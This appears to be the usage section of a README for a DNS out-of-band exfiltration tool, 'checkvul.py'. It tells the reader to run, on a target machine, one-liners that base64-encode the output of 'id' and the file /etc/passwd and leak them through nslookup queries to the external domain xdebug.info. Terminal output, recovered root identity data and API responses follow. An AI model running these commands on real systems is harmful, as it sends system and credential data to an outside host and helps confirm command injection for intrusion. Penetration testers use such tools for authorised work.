#Usage  
  
###start###  
nohup python checkvul.py 2>&1 &  
  
###query###  
  
Execute The Following Command On Your Target:  
  
id |base64 -w60|cat -n|awk '{print $2"."$1".xdebug.info"};'|xargs -n 1 nslookup  
  
##############################################################################################  
root@vultr:~# id |base64 -w60|cat -n|awk '{print $2"."$1".xdebug.info"};'|xargs -n 1 nslookup  
Server:		108.61.10.10  
Address:	108.61.10.10#53  
  
Non-authoritative answer:  
Name:	dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK.1.xdebug.info  
Address: 127.0.0.1  
##############################################################################################  
  
Access following API:  
http://127.0.0.1/_query  
  
Response:  
  
"""  
ECHO  
  
uid=0(root) gid=0(root) groups=0(root)  
  
****************************************************************************************************  
DNS  
dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK.1.xdebug.info. 45.32.103.184 2018-11-19 16:36:28  
1.xdebug.info. 45.32.103.184 2018-11-19 16:36:28  
xdebug.info. 45.32.103.184 2018-11-19 16:36:28  
****************************************************************************************************  
  
""""  
  
###check###  
  
nslookup check.7b0f687d4d6d.xdebug.info  
  
######################################################  
root@vultr:~# nslookup check.7b0f687d4d6d.xdebug.info  
Server:		108.61.10.10  
Address:	108.61.10.10#53  
  
Non-authoritative answer:  
Name:	check.7b0f687d4d6d.xdebug.info  
######################################################  
  
Request API:  
http://localhost/_check?type=dns&uuid=7b0f687d4d6d  
  
Response JSON:  
{"result": 1, "uuid": "7b0f687d4d6d", "log": "check.7b0f687d4d6d.xdebug.info.\t45.32.103.184\t2018-11-19 16:22:41"}  
  
###echo###  
  
cat /etc/passwd |base64 -w60|cat -n|awk '{print $2"."$1".8b0f687d4d6d.xdebug.info"};'|xargs -n 1 nslookup  
  
#################################################################################################  
root@vultr:~# id |base64 -w60|cat -n|awk '{print $2"."$1".9b0f687d4d6d.xdebug.info"};'|xargs -n 1 nslookup  
Server:		108.61.10.10  
Address:	108.61.10.10#53  
  
Non-authoritative answer:  
Name:	dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK.1.9b0f687d4d6d.xdebug.info  
Address: 127.0.0.1  
  
#################################################################################################  
  
Request API:  
http://localhost/_echo?type=dns&uuid=9b0f687d4d6d  
  
Response JSON:  
{"result": "uid=0(root) gid=0(root) groups=0(root)\n", "uuid": "9b0f687d4d6d", "log": "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6.1.8b0f687d4d6d.xdebug.info.\t45.32.103.184\t2018-11-19 16:27:31"}  
